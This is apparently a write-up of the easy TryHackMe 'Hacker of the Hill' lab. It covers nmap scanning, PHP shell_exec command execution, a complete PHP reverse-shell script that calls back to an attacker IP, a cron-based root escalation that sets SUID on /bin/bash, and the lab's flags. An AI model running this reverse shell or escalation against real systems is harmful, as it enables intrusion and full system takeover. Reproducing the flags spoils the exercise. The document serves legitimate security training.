# Hacker of the Hill

**Date:** 15, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/hackerofthehill) to go to the TryHackMe room.

# Easy Challenge

## Enumeration

- Running nmap:
```bash
$ nmap -sC -sV -p- 10.10.156.206 -oN nmap-easy
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-15 19:11 IST

Nmap scan report for 10.10.156.206
Host is up (0.17s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:75:95:c7:6d:f4:92:a0:0e:1e:60:b8:be:4d:92:b1 (RSA)
|   256 a2:11:fb:e8:c5:c6:f8:98:b3:f8:d3:e3:91:56:b2:34 (ECDSA)
|_  256 72:19:b7:04:4c:df:18:be:6b:0f:9d:da:d5:14:68:c5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/vbcms
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VeryBasicCMS - Home
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: My Website
|_Requested resource was /?page=home.php
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Learn PHP
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 15 May 2021 13:57:41 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 15 May 2021 13:57:40 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=5/15%Time=609FD355%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x2020
SF:21\x2013:57:40\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2013:5
SF:7:41\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2013:57:41
SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1043.16 seconds

```

## Vbcms
- On `http://10.10.95.253:8000/robots.txt`

```
User-agent: *
Disallow: /vbcms
```

- Sign in with admin:admin in `http://10.10.95.253:8000/vbcms`
- May be a Rabbit Hole ;-)


## Exploiting the Webpage on Port 8001
- Visit `http://10.10.156.206:8002/lesson/1`
- We have PHP command execution on that webpage. So, we'll use `shell_exec` to execute shell commands.

### What is the user flag for the serv1 user?
- **Answer:** THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}
- **Steps to Reproduce:**
    - By using the hint, we can cat the file `/usr/games/fortune`:

```php
echo shell_exec("cat /usr/games/fortune");

VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo=
```

    - It is base64 encoded.

```bash
$ echo VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo= | base64 -d

THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}
```

---

### What is the user flag for the serv2 user?
- **Answer:** THM{Bet_You're_Glad_This_Is_Not_A_Hash}
- **Steps to Reproduce:** 
    - By using the hint, we can cat the file `/var/lib/rary`:

```php
echo shell_exec("cat /var/lib/rary");

 _____ _   _ __  __   ______       _    __   __          _              ____ _ 
|_   _| | | |  \/  | / / __ )  ___| |_  \ \ / /__  _   _( )_ __ ___    / ___| |
  | | | |_| | |\/| || ||  _ \ / _ \ __|  \ V / _ \| | | |/| '__/ _ \  | |  _| |
  | | |  _  | |  | < < | |_) |  __/ |_    | | (_) | |_| | | | |  __/  | |_| | |
  |_| |_| |_|_|  |_|| ||____/ \___|\__|___|_|\___/ \__,_| |_|  \___|___\____|_|
                     \_\             |_____|                      |_____|      
           _   _____ _     _         ___         _   _       _          _    
  __ _  __| | |_   _| |__ (_)___    |_ _|___    | \ | | ___ | |_       / \   
 / _` |/ _` |   | | | '_ \| / __|    | |/ __|   |  \| |/ _ \| __|     / _ \  
| (_| | (_| |   | | | | | | \__ \    | |\__ \   | |\  | (_) | |_     / ___ \ 
 \__,_|\__,_|___|_| |_| |_|_|___/___|___|___/___|_| \_|\___/ \__|___/_/   \_\
           |_____|             |_____|     |_____|             |_____|       
      _   _           _   __   
     | | | | __ _ ___| |__\ \  
     | |_| |/ _` / __| '_ \| | 
     |  _  | (_| \__ \ | | |> >
 ____|_| |_|\__,_|___/_| |_| | 
|_____|                   /_/  

```

---

### What is the user flag for the serv3 user?
- **Answer:** THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}
- **Steps to Reproduce:** 
    - By using the hint, we can cat the file `/var/www/serv4/index.php`:

```php
echo shell_exec("cat /var/www/serv4/index.php");

THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}
```

---

### What is the root.txt flag?
- **Answer:** THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
- **Steps to Reproduce:** 
   - To get the reverse shell, paste the **php-reverse-shell code**:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.3.212';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
```

- For Privilege Escalation, we can use the **cron**. I just noticed that cron was running as root, by listing all the processes (`ps -aux`):

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /home/serv3/backups/backup.sh

$ cat /home/serv3/backups/backup.sh
#!/bin/bash
mv /backups/* /home/serv3/backups/files
```

- Privilege Escalation, by changing the permission of `/bin/bash`. 
- The argument `-p`	stands for **privileged** -	Script runs as **"suid"**.

```bash
$ echo "chmod 4777 /bin/bash" >> backup.sh
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash

$ /bin/bash -p

bash-4.4# cat /root/root.txt
THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
```

---

# Medium Challenge


---

## References
- [Advanced Bash Scripting Guide](https://tldp.org/LDP/abs/html/options.html)